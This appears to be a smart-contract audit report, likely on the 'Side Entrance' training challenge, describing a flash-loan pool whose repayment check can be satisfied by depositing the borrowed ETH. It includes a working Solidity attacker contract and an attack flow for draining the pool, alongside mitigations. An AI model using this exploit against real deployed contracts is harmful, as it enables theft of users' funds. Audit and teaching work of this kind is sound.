---
title: Side Entrance Audit Report
author: Jack
date: January 08, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---


Prepared by: [Jack](https://github.com/Jack-OuCJ)

# Table of Contents
- [Severity Classification](#severity-classification)
- [Summary](#summary)
- [Findings](#findings)
  - [High](#high)

# Severity Classification

| Severity         | Description |
| ---------------- | ----------- |
| ![high]          | A **directly** exploitable security vulnerability that leads to stolen/lost/locked/compromised assets or catastrophic denial of service. |
| ![medium]        | Assets not at direct risk, but the function of the protocol or its availability could be impacted. |
| ![low]           | A violation of common best practices or incorrect usage of primitives, which may not currently have a major impact on security. |
| ![informational] | Non-critical comments, recommendations or potential optimizations, not relevant to security. |

# Summary

| Severity         | Number of issues found |
| ---------------- | ---------------------- |
| ![high]          | 1                      |
| ![medium]        | 0                      |
| ![low]           | 0                      |
| ![informational] | 0                      |
| Total            | 1                      |

# Findings

## High

### [H-1] Flashloan repayment check relies on raw contract balance, allowing deposit-in-callback to satisfy the check while creating a free balance credit

**Description:** `SideEntranceLenderPool::flashLoan()` validates repayment by comparing the contract's raw ETH balance before and after the callback, rather than verifying that borrowed ETH was returned directly:

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    // ⚠️ Only checks raw balance, ignores internal accounting (balances mapping)
    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}
```

The pool also maintains an internal `balances` mapping for tracking each user's depositable ETH, updated through `deposit()`. An attacker can implement `execute()` to call `deposit{value: amount}()` with the borrowed ETH during the callback. This makes `address(this).balance` appear unchanged (satisfying the repayment check) while simultaneously crediting the full borrowed amount to the attacker's internal balance. The attacker then calls `withdraw()` to extract the funds.

**Impact:** An attacker with no initial capital can drain the entire ETH balance of the pool. The attack requires no upfront funds beyond gas costs, and the pool's internal accounting incorrectly treats loan repayment via `deposit()` as a legitimate user deposit.

**Proof of Concept:**

```solidity
contract Attacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address recovery;

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        recovery.call{value: address(this).balance}("");
    }

    function execute() external payable {
        // Repay the loan by depositing — raw balance stays equal, credit goes to attacker
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

Attack flow:
1. Attacker calls `flashLoan(1000 ETH)`.
2. Pool sends 1000 ETH, calls `attacker.execute()`.
3. Attacker calls `pool.deposit{value: 1000 ETH}()` → `balances[attacker] = 1000 ETH`, `address(pool).balance = 1000 ETH`.
4. Repayment check passes (`1000 >= 1000`).
5. Attacker calls `pool.withdraw()` → receives 1000 ETH.

**Recommended Mitigation:**

The repayment check must verify that the borrowed amount was returned as a loan repayment, not as a deposit. Options include:

1. **Track deposit-adjusted balance:** Check that `address(this).balance - totalDepositsAdded >= balanceBefore` (where `totalDepositsAdded` is the net new deposits during the callback).
2. **Disable deposit during flashloan:** Use a reentrancy lock or a state flag to prevent `deposit()` from being called during an active flashloan.
3. **Use a dedicated repayment path:** Require borrowers to send ETH back through a separate `repay()` function that does not credit `balances`.

[high]: https://img.shields.io/badge/-High-red "High"
[medium]: https://img.shields.io/badge/-Medium-orange "Medium"
[low]: https://img.shields.io/badge/-Low-yellow "Low"
[informational]: https://img.shields.io/badge/-Informational-blue "Informational"
